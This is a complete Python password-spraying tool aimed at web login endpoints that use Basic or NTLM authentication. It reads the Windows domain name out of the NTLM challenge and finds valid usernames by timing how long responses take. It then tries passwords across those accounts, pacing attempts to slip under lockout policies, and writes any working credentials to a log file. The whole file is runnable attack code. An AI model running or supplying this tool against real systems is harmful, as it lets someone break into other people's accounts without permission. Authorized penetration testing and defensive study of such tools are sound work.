#!/usr/bin/env python3

import requests
from requests_ntlm2 import HttpNtlmAuth

from base64 import b64encode as be, b64decode as bd
import argparse
from time import sleep, time
from datetime import datetime
import urllib3
import base64
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from multiprocessing import Pool

valid_users = []

def check_creds(opts):

    url, domain, username, password, authtype, proxies, track_time = opts
    
    if authtype == "ntlm":
        if domain:
            auth = HttpNtlmAuth(f"{domain}\\{username}", password)    
        else:
            auth = HttpNtlmAuth(username, password)

    else:
        if domain:
            auth = (f"{domain}\\{username}", password)
        else:
            auth = (username, password)

    try:
        res = requests.get(url, verify=False, proxies=proxies,
                           auth=auth, allow_redirects=False)



        if res.status_code != 401:
            if track_time:
                print(f"Success! {username}:{password}")
            else:
                print(f"Success! {username}:{password}")

            return username, password

        elif track_time:
            print(f"Fail:  {username}:{password}")
    except Exception as e:
        print(f"Error occurred with {username}:{password}: {e}")

def do_request(domain, username, password, proxies, url):
    auth_false_domain = (f"{domain}\\{username}", password)
    res = requests.get(url, verify=False, proxies=proxies, auth=auth_false_domain, allow_redirects=False)
    print("[+] auth creds: %s\\%s, time elapsed: " % (domain, username) + str(res.elapsed))
    return res.elapsed

def get_avg_time(opts, passwords):

    url, domain, authtype, proxies, track_time = opts

    if domain == "":
        domain = get_domain_name(url)

    username1 = "aaaaaaz"
    username2 = "bbbbbbz"
    username3 = "ccccccz"
    domain_test = "random"
    domain_test2 = "anything1"
    domain_test3 = "bread_man"

    print("[*] Performing incorrect Domain Test")
    do_request(domain_test, username1, passwords[0], proxies, url)
    do_request(domain_test2, username2, passwords[0], proxies, url)
    do_request(domain_test3, username3, passwords[0], proxies, url)

    print("[*] Performing incorrect Username Test")
    time_one = do_request(domain, username1, passwords[0], proxies, url)
    time_two = do_request(domain, username2, passwords[0], proxies, url)
    time_three = do_request(domain, username3, passwords[0], proxies, url)


    avg_time = (time_one + time_two + time_three) / 3
    return avg_time, domain

def check_username(opts):
    url, domain, username, password, authtype, proxies, track_time, thresh = opts
    auth = (f"{domain}\\{username}", password)
    res = requests.get(url, verify=False, proxies=proxies, auth=auth, allow_redirects=False)

    if res.elapsed <= thresh:
        print("[+] VALID USER FOUND: %s\\%s, time elapsed: " % (domain, username) + str(res.elapsed))
        valid_users.append(username)
    elif res.elapsed > thresh:
        #print("[-] INVALID USER: %s\\%s, time elapsed: " % (domain, username) + str(res.elapsed), flush=True)
        return

def get_domain_name(url):
    reg = "^(([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\-]*[a-zA-Z0-9])\.){2,}([A-Za-z0-9]|[A-Za-z0-9][A-Za-z0-9\-]*[A-Za-z0-9]){2,}$"

    headers={"Authorization" : "NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=="}
    res = requests.get(url=url, headers=headers)
    ntlm = res.headers['WWW-Authenticate'].split()
    b64_str = base64.b64decode(ntlm[1])[7:]
    ntlm_string = re.sub('[^\x21-\x39\x41-\x5A\x61-\x7A\x5F]+',',',str(b64_str))
    ntlm_string_split = ntlm_string.split('x00.')
    tld = ntlm_string_split[3].split(',')[:4]
    tld_str = ""
    for i in tld:
        tld_str += i.replace("x00","").replace(",","")
    domain = ntlm_string_split[2].replace("x00","").replace(",","") + "." + tld_str

    print("[+] Domain Found: %s" % (domain))
    return domain


if __name__ == "__main__":

    args = argparse.ArgumentParser()

    args.add_argument('-u', '--usernames', help="List of usernames to attack", required=True)
    args.add_argument('-p', '--passwords', help="List of passwords to try", required=True)
    args.add_argument('-d', '--domain', help="Domain name to append. If not included, then domains will be assumed to be in username list.", required=False, default="")
    args.add_argument('-U', '--url', help="URL to authenticate against", required=True)
    args.add_argument('-a', '--attempts', 
                        help="Number of attempts to try before sleeping. If your lockout policy is 5 attempts per 10 minutes, then set this to like 3", 
                        type=int, default=1)
    args.add_argument('-i', '--interval', 
                        help="Number of minutes to sleep between attacks. If your lockout policy is per 10 minutes, set this to like 11",
                        type=int, default=120)
    args.add_argument('--authtype', help="Authentication type - basic or ntlm. Note: You can't use a proxy with NTLM", choices=['ntlm', 'basic'], default="basic")
    args.add_argument('--proxy', help="Proxy server to route traffic through")
    args.add_argument('-t', '--threads', help="Number of threads", type=int, default=1)
    args.add_argument('-o', '--output', help="File to write successful pairs to", default="success.log")
    args.add_argument("--add_response", help="Add response times to output", action="store_true")
    args.add_argument("-v", "--validate_users", help="Validates the list of usernames. By default will also run password spraying attack.", required=False, default=False, action='store_true')
    args.add_argument("-c", "--check_creds", help="Runs the password spraying attack", required=False, default=False, action='store_true')
    opts = args.parse_args()

    if opts.proxy and opts.authtype == 'basic':
        proxies = {'http': opts.proxy, 'https': opts.proxy}
    else:
        proxies = {}

    usernames = [u for u in open(opts.usernames).read().split('\n') if u]
    passwords = [p for p in open(opts.passwords).read().split('\n') if p]

    i = 0
    current = 1
    total = len(passwords)
    f = open(opts.output, 'a')
    f.write(f"New run: {str(datetime.now())}\n")
    print(f"New password spraying run")
    print(f"Spraying {opts.attempts} passwords, then sleeping for {opts.interval}.")
    print(f"URL: {opts.url}")
    if(opts.check_creds):

        for p in passwords:

            i += 1

            print(f"{str(datetime.now())}: Attempting {p} ({current}/{total})")
            attempts = [ (opts.url, opts.domain, u, p, opts.authtype, proxies, opts.add_response) for u in usernames]
            with Pool(opts.threads) as p:
                for s in p.imap_unordered(check_creds, attempts):
            
                    if s:
                        f.write(f"{s[0]}:{s[1]}" + '\n')
                        f.flush()

            if i == opts.attempts:
                print(f"{str(datetime.now())} Sleeping for {opts.interval} minutes.")
                sleep(opts.interval * 60)

                i = 0

            current += 1
    elif(opts.validate_users):
        attempts = (opts.url, opts.domain, opts.authtype, proxies, opts.add_response)
        avg_time, domain = get_avg_time(attempts, passwords)
        print("[+] Avg time: " + str(avg_time))
        thresh = avg_time * 0.6
        print("[*] Threshold: " + str(thresh))
        if opts.domain != "":
            domain = opts.domain

        attempts = [(opts.url, domain, u, passwords[0], opts.authtype, proxies, opts.add_response, thresh) for u in usernames]
        with Pool(opts.threads) as p:
            for s in p.imap_unordered(check_username, attempts):

                if s:
                    f.write(f"{s[0]}:{s[1]}" + '\n')
                    f.flush()

        valid_users_file = open("valid_users.txt", "w")
        for user in valid_users:
            valid_users_file.write(user + "\n")

        i = 0
        for p in passwords:
            i += 1
            attempts = [(opts.url, domain, u, p, opts.authtype, proxies, opts.add_response) for u in valid_users]
            with Pool(opts.threads) as p:
                for s in p.imap_unordered(check_creds, attempts):
                    if s:
                        f.write(f"{s[0]}:{s[1]}" + '\n')
                        f.flush()

            if i == opts.attempts:
                print(f"{str(datetime.now())} Sleeping for {opts.interval} minutes.")
                sleep(opts.interval * 60)
                i = 0

